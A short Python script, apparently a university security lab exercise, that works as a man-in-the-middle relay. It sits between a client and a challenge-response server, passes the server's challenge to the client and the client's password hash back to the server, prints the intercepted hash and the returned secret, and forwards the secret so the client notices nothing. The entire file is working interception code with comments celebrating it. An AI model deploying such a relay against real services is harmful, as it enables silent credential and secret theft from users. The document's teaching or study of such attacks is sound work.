import socket

#The actual Server
Server_addr = 'taranis.eecs.utk.edu'
Server_Port = 15153

#Me, a.k.a the MAN in the middle
Middle_addr = socket.gethostname()
Middle_port = 53484

#create two socket, one for the client and one for the server
sock_to_serve = socket.socket()
sock_to_client = socket.socket()

#Bait sliently 5 seconds for the fish a.k.a the client a.k.a me
sock_to_client.bind((Middle_addr, Middle_port))
sock_to_client.listen(5)

#Get the client address, basically my own address and some port number assigned by linux OS
(client, address) = sock_to_client.accept()
sock_to_serve.connect((Server_addr, Server_Port)) #connect to the Real Server now!

#Starting do some bad things!
Challege_str = sock_to_serve.recv(20480) #Get the challenging string from the server
print "Challege_str: ", Challege_str
client.send(Challege_str)                #Hand the challenging string to the client a.k.a me
hash_pass = client.recv(20480)           #Get the password_hash from the client
print "hash_pass: ", hash_pass
sock_to_serve.send(hash_pass)            #Hand the password_hash to the server the get the secret!!!
secret = sock_to_serve.recv(20480)       #Finally we got it, bravo!
print secret
client.send(secret)                      #Dont forget to hand the secret back to the client, so that no one knows we are the man in the middle!
